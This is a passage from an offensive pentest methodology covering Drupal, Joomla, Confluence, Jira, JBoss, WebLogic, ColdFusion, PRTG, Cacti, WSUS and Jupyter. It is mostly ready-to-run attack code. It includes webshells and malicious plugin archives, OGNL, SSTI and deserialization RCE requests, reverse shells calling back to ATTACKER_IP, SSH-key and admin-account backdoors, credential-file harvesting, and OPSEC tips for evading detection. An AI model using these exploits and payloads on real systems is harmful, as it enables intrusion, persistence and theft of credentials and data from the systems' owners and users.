Authenticated RCE on Drupal 7/8 (post-2018-7600 patched fork).

```bash
searchsploit drupalgeddon3
# python3 PoC requires session cookie + form_token from /node/1/delete
```

### CVE-2019-6340 (REST patch_node)

Drupal 8.5.x < 8.5.11, 8.6.x < 8.6.10 with REST + PATCH/POST enabled.

```bash
curl -s -X GET http://<TARGET>/node/1?_format=hal_json
# Send PATCH with serialised PHP object → RCE
```

### Username Enumeration — Registration Form Oracle

Submit `/user/register` with a deliberately-invalid email so the form always fails — the response still discloses 'is already taken' iff the username exists. Avoids creating real accounts and login-form lockout/log volume.

```bash
# Pull form_build_id + form_token (Drupal regenerates per-request on some configs)
curl -s "http://<TARGET>/user/register" | grep -oE 'name="form_(build_id|token)" value="[^"]+"'

# Probe a single username — invalid mail forces failure path while still evaluating name uniqueness
# 'is already taken'  → username EXISTS
# 'is not valid' only → username FREE
curl -s -X POST "http://<TARGET>/user/register" \
  --data-urlencode "name=<USER_INPUT>" \
  --data-urlencode "mail=invalid;mail@x.x" \
  --data-urlencode "form_build_id=<TOKEN>" \
  --data-urlencode "form_token=<TOKEN>" \
  --data-urlencode "form_id=user_register_form" \
  --data-urlencode "op=Create new account" \
  | grep -E 'is already taken|is not valid'
```

Wordlist sweep — refresh tokens per-request if the site rejects token reuse.

```bash
for u in $(cat /usr/share/seclists/Usernames/Names/names.txt); do
  BUILD=$(curl -s "http://<TARGET>/user/register" | grep -oE 'name="form_build_id" value="[^"]+"' | cut -d'"' -f4)
  TOK=$(curl -s "http://<TARGET>/user/register" | grep -oE 'name="form_token" value="[^"]+"' | cut -d'"' -f4)
  curl -s -X POST "http://<TARGET>/user/register" \
    --data-urlencode "name=$u" \
    --data-urlencode 'mail=invalid;mail@x.x' \
    --data-urlencode "form_build_id=$BUILD" \
    --data-urlencode "form_token=$TOK" \
    --data-urlencode 'form_id=user_register_form' \
    --data-urlencode 'op=Create new account' \
    | grep -q 'is already taken' && echo "[+] valid: $u"
done
```

#### Living-off-the-land alternative — Burp Intruder

```text
# Sniper position on 'name' param of POST /user/register
# Grep-Match: 'is already taken'
# Refresh form_build_id/form_token via Macro/Session-Handling rule if reuse is rejected
```

#### Variant — /user/password forgot-password oracle

```bash
# Some Drupal configs disclose: 'Sorry, <USER> is not recognized as a username or an e-mail address.'
curl -s -X POST "http://<TARGET>/user/password" \
  --data-urlencode "name=<USER_INPUT>" \
  --data-urlencode "form_id=user_pass" \
  --data-urlencode "op=E-mail new password" \
  | grep -E 'is not recognized|Further instructions'
```

> **OPSEC:** High volume of POST `/user/register` from one IP shows up in watchdog as 'is already taken' messages and form_token churn — pace the sweep, rotate source IP, or pivot to `/user/password` if the registration form is monitored.

### Admin → PHP Filter Module RCE (Drupal 7)

Post-admin RCE chain — works with any path to admin (default creds, brute, Drupalgeddon3, post-cred-reuse). D7 ships PHP filter as a core module (disabled). D8/9 ship it as a contrib module — only present if installed.

```bash
# Set target + auth cookie (grab SESS<...> from browser after admin login)
DRUPAL=http://<TARGET>
COOKIE='SESS<HASH>=<SESSION>'

# 1. Pull form_build_id + form_token from /admin/modules
curl -s -b "$COOKIE" "$DRUPAL/admin/modules" | \
  grep -oE 'name="form_(build_id|token)" value="[^"]+"'

# 2. Enable PHP filter core module (Burp repeater is easier — module-list field is huge)
curl -s -b "$COOKIE" -X POST "$DRUPAL/admin/modules" \
  --data-urlencode 'modules[Core][php][enable]=1' \
  --data-urlencode 'form_build_id=<BUILD_ID>' \
  --data-urlencode 'form_token=<TOKEN>' \
  --data-urlencode 'form_id=system_modules' \
  --data-urlencode 'op=Save configuration'

# 3. Browser: /node/add/page
#    Body = <?php system($_GET['c']); ?>
#    Text format = 'PHP code'
#    Click Preview → PHP renders without publishing
#    Hit:  $DRUPAL/node/<NID>?c=id
```

Reverse shell payload — paste into Body, set Text format = `PHP code`, click Preview:

```bash
# https://github.com/pentestmonkey/php-reverse-shell
cp /usr/share/webshells/php/php-reverse-shell.php .
sed -i "s/127.0.0.1/<ATTACKER_IP>/; s/1234/<ATTACKER_PORT>/" php-reverse-shell.php
cat php-reverse-shell.php   # paste body into Drupal Basic page
nc -lvnp <ATTACKER_PORT>
```

One-liner alternative for the Body field:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'"); ?>
```

#### Living-off-the-land alternative — drush php-eval

```bash
# Drupal CLI — present on many target boxes; runs as web user
drush php-eval 'system("id");'
drush ev 'system("id");'
drush ev 'system("bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1\"");'
```

> **OPSEC:** module enable hits `watchdog` (`module 'php' enabled`); new node logs `text_format = php_code`; php-fpm/apache spawning bash is a high-fidelity IOC.

> **D8/9 caveat:** PHP filter is contrib only — `curl -sI $DRUPAL/modules/php/php.info.yml` to confirm before this chain.

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2018-7600 | 6/7/8 | Drupalgeddon2 — unauth RCE |
| CVE-2018-7602 | 7/8 | Drupalgeddon3 — auth RCE |
| CVE-2019-6340 | 8.5/8.6 REST | PATCH RCE |
| CVE-2014-3704 | 7.x < 7.32 | "Drupageddon" — SQLi → admin |

### Post-Exploit

```bash
cat sites/default/settings.php                # DB creds
ls sites/default/files/private/                # uploaded files
# Drupal hashes: $S$ format → hashcat -m 7900
```

---

## Phase 7: Joomla

### Enumeration

```bash
# Banner
curl -sI http://<TARGET>/                     # X-Powered-By: Joomla
curl -s http://<TARGET>/administrator/manifests/files/joomla.xml | grep version

# joomscan
joomscan -u http://<TARGET>
joomscan -u http://<TARGET> --enumerate-components

# joomlavs (Ruby)
ruby joomlavs.rb -u http://<TARGET> -a
```

### Default Credentials

```text
admin:admin
joomla:joomla
admin:password
admin:joomla
```

### CVE-2017-8917 — com_users SQLi

Joomla 3.7.0 — unauth SQLi via `list[fullordering]` parameter.

```bash
sqlmap -u "http://<TARGET>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent --dbs

searchsploit joomla 2017-8917
```

### Authenticated Template Edit RCE

After admin login → Templates → Edit → modify `index.php`:

```php
<?php system($_GET['c']); ?>
```

Trigger: `http://<TARGET>/templates/<TEMPLATE>/index.php?c=id`

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2023-23752 | 4.0.0–4.2.7 | Auth bypass via API |
| CVE-2020-35616 | 3.0.0–3.9.22 | ACL violation |
| CVE-2017-8917 | 3.7.0 | Unauth SQLi |
| CVE-2015-8562 | 1.5.0–3.4.5 | Object injection RCE |

---

## Phase 7b: Generic CMS — Auth Admin → Extension Archive Upload → RCE

Pattern that generalises across many CMS / e-commerce platforms (Drupal contrib modules, Backdrop CMS, Joomla components/modules/templates, Bagisto, October CMS, etc.). If an authenticated admin can upload a "module / plugin / theme / extension / component" archive (`.zip` / `.tar.gz` / `.tgz` / `.module`), and the platform extracts it into the webroot before validating contents, drop a webshell at the path the platform expects to execute (e.g. the entry-point file referenced by the manifest) and browse to it.

Identify the install endpoint (varies by platform):

```text
Drupal       /admin/modules/install               (Update Manager — needs FTP/SSH creds OR archive_uploader module)
Backdrop CMS /admin/modules/install               (built-in archive uploader, no FTP creds required)
Joomla       /administrator/index.php?option=com_installer&view=install
October CMS  /backend/system/updates               (Marketplace tab → Install plugin from file)
Bagisto      /admin/marketplace/packages/upload    (admin-uploaded package)
WordPress    /wp-admin/plugin-install.php?tab=upload  /wp-admin/theme-install.php?tab=upload
Magento      /admin/admin/system_config/edit       (component manager — varies by version)
```

Craft the malicious archive — minimum viable structure is a manifest + one PHP file the manifest points at.

```bash
# Generic Drupal-flavoured module archive (works for Drupal 7 / Backdrop CMS — adapt naming)
NAME=pwn
mkdir -p $NAME
cat > $NAME/$NAME.info <<EOF
name = $NAME
description = pwn
package = Other
core = 7.x
version = 1.0
EOF

cat > $NAME/$NAME.module <<'EOF'
<?php
// .module is executed on every page load once the module is enabled
if (isset($_GET['c'])) { system($_GET['c']); die; }
EOF

# Some platforms ship a webshell at any in-archive path → just need .php in the unpacked tree
cat > $NAME/shell.php <<'EOF'
<?php system($_GET['c']); ?>
EOF

tar czf $NAME.tar.gz $NAME/      # Drupal / Backdrop expect tarball
zip -r $NAME.zip $NAME/          # Joomla / WP / October / Bagisto expect zip
```

Joomla extension flavour — needs `<extension>` manifest XML at archive root.

```bash
NAME=pwn
mkdir -p $NAME
cat > $NAME/$NAME.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<extension type="component" version="3.0" method="upgrade">
  <name>$NAME</name>
  <version>1.0.0</version>
  <files>
    <filename>$NAME.php</filename>
  </files>
</extension>
EOF
cat > $NAME/$NAME.php <<'EOF'
<?php system($_GET['c']); ?>
EOF
zip -r $NAME.zip $NAME/
```

October CMS plugin flavour — `Plugin.php` + namespaced directory.

```bash
NAME=Pwn
mkdir -p attacker/$NAME
cat > attacker/$NAME/Plugin.php <<'EOF'
<?php namespace Attacker\Pwn;
class Plugin extends \System\Classes\PluginBase {
    public function pluginDetails() {
        if (isset($_GET['c'])) { system($_GET['c']); }
        return ['name'=>'pwn','description'=>'pwn','author'=>'a','icon'=>'icon-bug'];
    }
    public function registerComponents() {}
    public function registerSettings() {}
}
EOF
cd attacker && zip -r ../pwn.zip $NAME/ && cd ..
```

Upload via the admin UI (Burp / browser) — or scripted with the auth cookie pulled from a logged-in session.

```bash
SITE=http://<TARGET>
COOKIE='<SESSION_COOKIE>'

# Drupal / Backdrop — Update Manager / archive uploader
curl -s -b "$COOKIE" -X POST "$SITE/admin/modules/install" \
  -F "files[project_upload]=@$NAME.tar.gz" \
  -F "form_id=update_manager_install_form" \
  -F "form_build_id=<BUILD_ID>" \
  -F "form_token=<TOKEN>" \
  -F "op=Install"

# Joomla — extension installer (file upload tab)
curl -s -b "$COOKIE" -X POST "$SITE/administrator/index.php?option=com_installer&task=install.install" \
  -F "install_package=@$NAME.zip" \
  -F "installtype=upload" \
  -F "<TOKEN>=1"

# WordPress — plugin upload (admin role required)
curl -s -b "$COOKIE" -X POST "$SITE/wp-admin/update.php?action=upload-plugin" \
  -F "pluginzip=@$NAME.zip" \
  -F "_wpnonce=<NONCE>" \
  -F "install-plugin-submit=Install Now"

# October CMS — plugin install from file
curl -s -b "$COOKIE" -X POST "$SITE/backend/system/updates/onImportUpdates" \
  -F "plugin_file=@$NAME.zip"
```

Trigger the webshell — path varies by platform but follows the unpacked layout.

```bash
# Drupal contrib module (must enable first via /admin/modules)
curl "$SITE/sites/all/modules/$NAME/shell.php?c=id"
curl "$SITE/?q=$NAME&c=id"                                # via .module hook

# Backdrop
curl "$SITE/modules/$NAME/shell.php?c=id"

# Joomla component
curl "$SITE/components/com_$NAME/$NAME.php?c=id"
curl "$SITE/administrator/components/com_$NAME/$NAME.php?c=id"

# WordPress plugin
curl "$SITE/wp-content/plugins/$NAME/shell.php?c=id"

# WordPress theme — upload theme zip; entry point is template files
curl "$SITE/wp-content/themes/$NAME/404.php?c=id"

# October CMS
curl "$SITE/plugins/attacker/$NAME/shell.php?c=id"

# Bagisto package
curl "$SITE/packages/<vendor>/$NAME/src/shell.php?c=id"
```

Reverse shell payload (drop into the manifest entry-point file instead of `<?php system($_GET['c']); ?>`):

```bash
cp /usr/share/webshells/php/php-reverse-shell.php $NAME/$NAME.module
sed -i "s/127.0.0.1/<ATTACKER_IP>/; s/1234/<ATTACKER_PORT>/" $NAME/$NAME.module
nc -lvnp <ATTACKER_PORT>
```

> **OPSEC:** archive extraction logs the package name + admin user in CMS audit log; new files in `modules/` / `themes/` / `plugins/` / `components/` show up in any FIM that watches the webroot; PHP-FPM / Apache spawning `bash` from inside `<webroot>/modules/<name>/` is high-fidelity.
> **Variants when archive uploader is locked down:** install via FTP/SSH if creds are present (Drupal Update Manager prompts for them); Drupal 8/9 → use Composer endpoint if exposed; WordPress → theme uploader if plugin uploader is restricted; Joomla → install from URL pointing at attacker-hosted zip if file upload is blocked.

---

## Phase 8: Atlassian Confluence

### Enumeration

```bash
# Version disclosure
curl -s http://<TARGET>:8090/forgotuserpassword.action | grep -oP 'Confluence \d+\.\d+\.\d+'
curl -s http://<TARGET>:8090/rest/applinks/1.0/manifest                # often leaks build info
curl -s http://<TARGET>:8090/login.action

# nuclei templates
nuclei -t cves/ -tags confluence -u http://<TARGET>:8090
```

### CVE-2022-26134 — Unauth OGNL RCE

Confluence Server/DC < 7.18.1 — unauth RCE via OGNL injection in URL path.

```bash
# Manual PoC
curl "http://<TARGET>:8090/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"

# searchsploit
searchsploit confluence 2022-26134

# Reverse shell
RC="bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"
ENC=$(echo -n "$RC" | base64 -w0)
curl "http://<TARGET>:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28new%20java.lang.String%5B%5D%7B%22%2Fbin%2Fbash%22%2C%22-c%22%2C%22%7Becho%2C${ENC}%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%7D%29%7D/"
```

### CVE-2023-22515 — Privilege Escalation

Confluence DC/Server 8.0.0 – 8.5.1 — unauth attacker creates admin via setup endpoint.

```bash
# Re-trigger setup wizard, register admin
curl -s -X POST "http://<TARGET>:8090/setup/setupadministrator.action?bootstrapStatusProvider.applicationConfig.setupComplete=false" \
  --data-urlencode "username=hax" \
  --data-urlencode "password=hax" \
  --data-urlencode "fullName=hax" \
  --data-urlencode "email=<ATTACKER_EMAIL>" \
  -H "X-Atlassian-Token: no-check"
```

### CVE-2023-22527 — SSTI RCE

Confluence DC/Server 8.0.x – 8.5.3 — Velocity template injection in legacy paths.

```bash
# searchsploit confluence 2023-22527
# nuclei -t cves/2023/CVE-2023-22527.yaml -u http://<TARGET>:8090
curl -s -X POST "http://<TARGET>:8090/template/aui/text-inline.vm" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'label=\u0027%2B#{Runtime.getRuntime().exec(\u0022id\u0022)}%2B\u0027'
```

### Post-Exploit

```bash
# Confluence runs as `confluence` user
cat /var/atlassian/application-data/confluence/confluence.cfg.xml    # DB creds
# Often: postgres on localhost — pivot for further data
```

---

## Phase 9: Atlassian Jira

### Enumeration

```bash
curl -s http://<TARGET>:8080/secure/Dashboard.jspa | grep version
curl -s http://<TARGET>:8080/rest/api/2/serverInfo
curl -s http://<TARGET>:8080/rest/api/2/user/picker?query=          # auth required typically
```

### CVE-2022-0540 — Auth Bypass (Jira Seraph)

Jira Server/DC <8.13.18, 8.14–8.20.6, 8.21+. Specific endpoint auth bypass on Insight plugin.

```bash
# Bypass via Servlet Context Listener path traversal
curl -s "http://<TARGET>:8080/InsightPluginShowGeneralConfiguration.jspa"
# searchsploit jira 2022-0540
```

### CVE-2019-11581 — Template Injection RCE

Jira Server 4.4.0 – 8.2.2 (with SMTP outgoing mail enabled and `Contact Administrators Form` enabled). Velocity template injection via subject parameter.

```bash
# searchsploit jira 2019-11581
python3 jira_ssti.py http://<TARGET>:8080 "id"
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2023-22501 | 8.13.21–8.20.10, 9.0–9.5.1 | Auth bypass via email |
| CVE-2022-0540 | various | Insight auth bypass |
| CVE-2019-11581 | 4.4.0–8.2.2 | SSTI RCE |
| CVE-2017-9506 | OAuth plugin | SSRF |

---

## Phase 10: JBoss / Wildfly

### Enumeration

```bash
# Default ports: 8080, 9990 (mgmt), 8009 (AJP), 1090, 4444, 4445
curl -s http://<TARGET>:8080/                                        # banner
curl -s http://<TARGET>:8080/jmx-console/                            # JMX (legacy)
curl -s http://<TARGET>:8080/web-console/
curl -s http://<TARGET>:8080/admin-console/
curl -s http://<TARGET>:8080/invoker/JMXInvokerServlet
curl -s http://<TARGET>:9990/                                        # mgmt console (modern)
curl -s http://<TARGET>:9990/management?recursive&json.pretty
```

### Exploitation — JMXInvokerServlet (legacy JBoss 4.x/5.x/6.x)

```bash
# jexboss — automated
git clone https://github.com/joaomatosf/jexboss
python3 jexboss.py -u http://<TARGET>:8080
python3 jexboss.py -host http://<TARGET>:8080 --jmx-console     # specify path
python3 jexboss.py -host http://<TARGET>:8080 --servlet-exec    # JMXInvokerServlet
```

### Exploitation — JMX-Console MainDeployer

```bash
# Deploy WAR via JMX MainDeployer (no auth on misconfigured installs)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f war -o shell.war
curl -F "file=@shell.war" http://<TARGET>:8080/jmx-console/HtmlAdaptor?action=invokeOpByName \
  --data-urlencode "name=jboss.system:service=MainDeployer" \
  --data-urlencode "methodName=deploy" \
  --data-urlencode "argType=java.lang.String" \
  --data-urlencode "arg0=http://<ATTACKER_IP>/shell.war"

# Trigger
curl http://<TARGET>:8080/shell/
```

### Wildfly mgmt-console (port 9990)

```bash
# Default creds (rare in prod): admin:admin / admin:password
curl -u admin:admin --digest http://<TARGET>:9990/management

# After auth, deploy WAR via mgmt API:
curl -u admin:admin --digest -X POST http://<TARGET>:9990/management \
  -H "Content-Type: application/json" \
  -d '{"operation":"add","address":[{"deployment":"shell.war"}],"content":[{"input-stream-index":0}],"enabled":"true"}' \
  -F "file=@shell.war"
```

---

## Phase 11: Oracle WebLogic

### Enumeration

```bash
# Default ports: 7001 (HTTP), 7002 (HTTPS), 7000 (T3), 9090
curl -s http://<TARGET>:7001/console/login/LoginForm.jsp | grep -i weblogic
curl -s http://<TARGET>:7001/console/                                # admin console (12c+)

# T3 protocol probe (Oracle proprietary)
nmap -p 7001 --script weblogic-t3-info <TARGET>

# Banner via T3
echo -e "t3 12.2.1\nAS:255\nHL:19\n\n" | nc <TARGET> 7001
```

### CVE-2020-2883 / CVE-2020-14882 / CVE-2021-2109 — T3 Deserialization Chains

```bash
# CVE-2020-14882 — auth bypass (admin console access)
curl -sk "http://<TARGET>:7001/console/css/%252e%252e%252fconsole.portal"

# CVE-2020-14883 — RCE via /console/console.portal (after 14882 bypass)
curl -sk "http://<TARGET>:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27id%27);%22)"

# Exploit chains (multi-CVE):
git clone https://github.com/Y4er/CVE-2020-14882
python3 cve-2020-14882.py http://<TARGET>:7001 "id"
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2020-2883 | 10.3.6, 12.x, 14.x | T3 deserialization RCE |
| CVE-2020-14882/14883 | 10.3.6, 12.x, 14.x | Console auth bypass + RCE |
| CVE-2021-2109 | 10.3.6, 12.x, 14.x | RCE via JNDI |
| CVE-2017-10271 | 10.3.6 / 12.1.3 / 12.2.1.1+ | XMLDecoder RCE |
| CVE-2019-2725 | 10.3.6 / 12.1.3 | wls9-async XMLDecoder RCE |

---

## Phase 12: Adobe ColdFusion

### Enumeration

```bash
# Default ports: 8500 (built-in), 80/443 (IIS-fronted)
curl -s http://<TARGET>:8500/CFIDE/administrator/                    # admin login
curl -s http://<TARGET>:8500/CFIDE/adminapi/                         # API
curl -sI http://<TARGET>/CFIDE/main/ide.cfm | grep -i server
curl -s http://<TARGET>/CFIDE/wizards/common/utils.cfc?method=wizardHash    # version probe
```

### CVE-2023-26360 — Pre-Auth RCE

ColdFusion 2018 Update 15 / 2021 Update 5 and earlier — access control bypass + arbitrary file read/RCE.

```bash
# searchsploit coldfusion 2023-26360
git clone https://github.com/projectdiscovery/nuclei-templates
nuclei -t http/cves/2023/CVE-2023-26360.yaml -u http://<TARGET>:8500

# Manual file read
curl "http://<TARGET>:8500/CFIDE/wizards/common/utils.cfc?method=wizardHash&inPassword=foo" \
  --data-urlencode "x=../../lib/passwords.properties"
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2023-26360 | 2018u15, 2021u5 | Pre-auth file read / RCE |
| CVE-2023-26359 | 2018, 2021 | Deserialization RCE |
| CVE-2010-2861 | 8/9 | Path traversal → admin hash |

```bash
# CVE-2010-2861 — read admin password hash
curl "http://<TARGET>/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en"
# Crack as SHA1
```

---

## Phase 13: PRTG Network Monitor

### Enumeration

```bash
curl -sk https://<TARGET>:443/index.htm | grep -oP 'PRTG.*\d+\.\d+\.\d+'
curl -sk https://<TARGET>/api/getstatus.htm                           # version
curl -sk https://<TARGET>/api/sensors.json?username=prtgadmin&passhash=<HASH>
```

### Default Credentials

```text
prtgadmin:prtgadmin
```

### CVE-2018-9276 — Authenticated Command Injection

Auth admin can inject OS commands via "Notification Settings" → execute parameter on Windows host.

```text
1. Login as prtgadmin
2. Setup → Account Settings → Notifications → Add new notification
3. Execute Program → choose any .exe → Parameter:
   test.txt;net user pwn Pwn123! /add;net localgroup administrators pwn /add
4. Trigger notification (Test or via sensor threshold)
```

```bash
# Automated:
searchsploit prtg 2018-9276
# Metasploit:
msf6 > use exploit/windows/http/prtg_authenticated_rce
```

---

## Phase 14: Cacti

### Enumeration

```bash
curl -s http://<TARGET>/cacti/install/                                # version on install or login page
curl -s http://<TARGET>/cacti/index.php
```

### Default Credentials

```text
admin:admin    (forced change on first login)
guest:guest    (read-only)
```

### CVE-2022-46169 — Unauth RCE

Cacti < 1.2.23 — `remote_agent.php` IP-spoof check + command injection in `poll_for_data`.

```bash
# searchsploit cacti 2022-46169
python3 51166.py -u http://<TARGET>/cacti/ -c "id"

# Manual PoC
curl "http://<TARGET>/cacti/remote_agent.php?action=polldata&local_data_ids%5B0%5D=1&host_id=1&poller_id=`id`" \
  -H "X-Forwarded-For: 127.0.0.1"
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2022-46169 | < 1.2.23 | Unauth RCE |
| CVE-2023-39361 | < 1.2.25 | Auth SQLi |
| CVE-2023-51448 | < 1.2.26 | Auth blind SQLi → RCE |

---

## Phase 14b: WSUS Server — CVE-2025-59287 (Unauth SYSTEM RCE)

### Enumeration

```bash
# WSUS exposes :8530 (HTTP) and/or :8531 (HTTPS); banner identifies
nmap -sV -p 8530,8531 <TARGET>
curl -s http://<TARGET>:8530/ClientWebService/client.asmx?wsdl | head -40

# Pre-flight: check Microsoft KB applied (Oct 2025 Patch Tuesday)
# If host is reachable interactively: Get-HotFix | ? { $_.HotFixID -like 'KB506*' }
```

### CVE-2025-59287 — .NET BinaryFormatter Deserialization

```bash
# Applies when: WSUS server missing Oct 2025 KB; unauth SOAP endpoint accepts crafted serialized payload
# Test cost: nmap probe + KB check
# If patched: pivot to client-side WSUS update injection (windows-methodology.md 4.7.3) which is config, not patch

# PoC (multiple public after Nov 2025) — generate ysoserial.net payload, POST to client.asmx
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -nop -w hidden -enc <BASE64>" -o base64 > payload.b64
curl -X POST http://<TARGET>:8530/ClientWebService/client.asmx \
  -H 'Content-Type: text/xml; charset=utf-8' \
  -H 'SOAPAction: "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"' \
  --data-binary @payload.xml
# Payload runs as NETWORK SERVICE → SYSTEM via WSUS app pool identity
```

### Common WSUS CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| CVE-2025-59287 | Pre-Oct 2025 KB | Unauth SYSTEM RCE via .NET BinaryFormatter |
| Classic wsuxploit | HTTP-only WUServer | Client-side update injection (MITM) — see windows-methodology.md 4.7.3 |

---

## Phase 14c: Jupyter Notebook / JupyterLab

### Enumeration

```bash
# Default port: 8888 (sometimes 8889, 8890 if multiple instances)
curl -s http://<TARGET>:8888/                                       # login page or direct access
curl -s http://<TARGET>:8888/api                                    # API root
curl -s http://<TARGET>:8888/api/kernels                            # 403 if auth required, 200 if open
curl -s http://<TARGET>:8888/api/me                                 # identity info (with valid token)

# From a shell on the target — find running Jupyter instances
ss -tlnp | grep -i python
ps aux | grep -i jupyter
# Token is often visible in the process command line:
ps aux | grep jupyter | grep -oP 'token=\K\S+'
```

### Token Discovery

```bash
# Token locations (from reverse shell on target):
# 1. Process arguments (most common — token passed on start)
ps aux | grep jupyter | grep -oP 'token=\K\S+'

# 2. Jupyter's runtime directory
find / -path "*/jupyter/runtime/jpserver-*.json" 2>/dev/null
cat /home/<USER>/.local/share/jupyter/runtime/jpserver-*.json | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])"

# 3. Jupyter config file (hardcoded token)
find / -name "jupyter_*_config.py" 2>/dev/null | xargs grep -l token
grep -r "NotebookApp.token\|ServerApp.token" /home/ /etc/ /opt/ 2>/dev/null

# 4. Environment variables
env | grep -i jupyter

# 5. Notebook output / logs
find / -name "*.ipynb" 2>/dev/null
find / -name "jupyter*.log" 2>/dev/null | xargs grep token

# Validate token
curl -s 'http://127.0.0.1:8888/api/me' -H "Authorization: token <TOKEN>"
# Success → returns identity JSON; fail → 403
```

### Exploitation — CLI Kernel Execution (Lateral Movement)

> **Key insight:** If you have a reverse shell on the target and the Jupyter token, you do NOT need port forwarding. Execute code as the Jupyter user directly via the kernel WebSocket API from localhost. This is a **lateral movement** technique — Jupyter typically runs as a different user.

```bash
# Step 1 (ATTACKER): start listener
nc -lvnp 4445

# Step 2 (TARGET reverse shell): create a kernel + execute code via WebSocket
# Save this script, then run it — avoids shell escaping issues
cat > /tmp/jexec.py << 'PYEOF'
import json, http.client, socket, base64, os, struct, time

TOKEN = "<JUPYTER_TOKEN>"
HOST, PORT = "127.0.0.1", 8888
CMD = """import os; os.system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4445 0>&1'")"""

# Create a kernel via REST API
c = http.client.HTTPConnection(HOST, PORT)
c.request("POST", "/api/kernels", headers={"Authorization": f"token {TOKEN}"})
kid = json.loads(c.getresponse().read())["id"]
c.close()
print(f"[+] Created kernel: {kid}")

# WebSocket handshake (stdlib only — no pip packages needed)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
key = base64.b64encode(os.urandom(16)).decode()
handshake = (
    f"GET /api/kernels/{kid}/channels?token={TOKEN} HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    f"Upgrade: websocket\r\n"
    f"Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    f"Sec-WebSocket-Version: 13\r\n\r\n"
)
s.send(handshake.encode())
resp = s.recv(4096)
if b"101" not in resp:
    print("[-] WebSocket upgrade failed"); s.close(); exit(1)
print("[+] WebSocket connected")

# Build execute_request message
msg = json.dumps({
    "header": {"msg_id": "exec1", "msg_type": "execute_request",
               "username": "", "session": "sess1", "version": "5.3"},
    "parent_header": {}, "metadata": {},
    "content": {"code": CMD, "silent": False, "store_history": False,
                "user_expressions": {}, "allow_stdin": False, "stop_on_error": True},
    "channel": "shell"
}).encode()

# WebSocket frame (client must mask per RFC 6455)
mask = os.urandom(4)
frame = bytearray([0x81])  # FIN + TEXT opcode
length = len(msg)
if length < 126:
    frame.append(0x80 | length)
elif length < 65536:
    frame.append(0x80 | 126)
    frame.extend(struct.pack("!H", length))
frame.extend(mask)
frame.extend(bytes(b ^ mask[i % 4] for i, b in enumerate(msg)))
s.send(bytes(frame))
print(f"[+] Sent execute_request ({length} bytes)")
time.sleep(5)
s.close()
print("[+] Done — check your listener")
PYEOF

python3 /tmp/jexec.py
```

### Exploitation — Contents API (File Write as Jupyter User)

```bash
# Write a file to Jupyter's working directory as the Jupyter user
# Useful for: SSH key injection, cron jobs, web shells

# List files in Jupyter's working directory
curl -s 'http://127.0.0.1:8888/api/contents' \
  -H "Authorization: token <TOKEN>" | python3 -c "import sys,json; [print(f['path']) for f in json.load(sys.stdin).get('content',[])]"

# Write a reverse shell script
curl -s -X PUT 'http://127.0.0.1:8888/api/contents/pwn.sh' \
  -H "Authorization: token <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"type":"file","format":"text","content":"#!/bin/bash\nbash -i >& /dev/tcp/<ATTACKER_IP>/4445 0>&1\n"}'

# Write an SSH authorized_keys file (if Jupyter user has a home dir)
curl -s -X PUT 'http://127.0.0.1:8888/api/contents/../.ssh/authorized_keys' \
  -H "Authorization: token <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"type":"file","format":"text","content":"ssh-rsa <YOUR_PUBLIC_KEY> pwn\n"}'

# Create a terminal session (interaction requires WebSocket)
curl -s -X POST 'http://127.0.0.1:8888/api/terminals' \
  -H "Authorization: token <TOKEN>" -H "Content-Type: application/json"
```

### Post-Exploit

```bash
# Identify the Jupyter user
curl -s 'http://127.0.0.1:8888/api/me' -H "Authorization: token <TOKEN>"

# Jupyter often runs as a service account — check its permissions
id                                          # after getting shell as Jupyter user
sudo -l                                     # common: conda, pip, or system commands

# Credential harvesting from notebooks
find / -name "*.ipynb" 2>/dev/null          # notebooks may contain hardcoded creds, API keys
grep -r "password\|secret\|token\|api_key" /home/*/.jupyter/ 2>/dev/null

# Jupyter config may have plaintext passwords
cat /home/*/.jupyter/jupyter_*_config.py 2>/dev/null | grep -i password
```

> **Why this matters for lateral movement:** Jupyter typically runs as a different user than your initial foothold. The kernel executes code as the Jupyter process owner — so exploiting it gives you a shell as that user without needing credentials. The pure-Python WebSocket script uses only stdlib (`http.client`, `socket`, `struct`) — no `pip install` required, since Python is guaranteed to exist where Jupyter runs.

### 14c.2 Other Data-Analysis / Notebook Web Apps with Scripting RCE

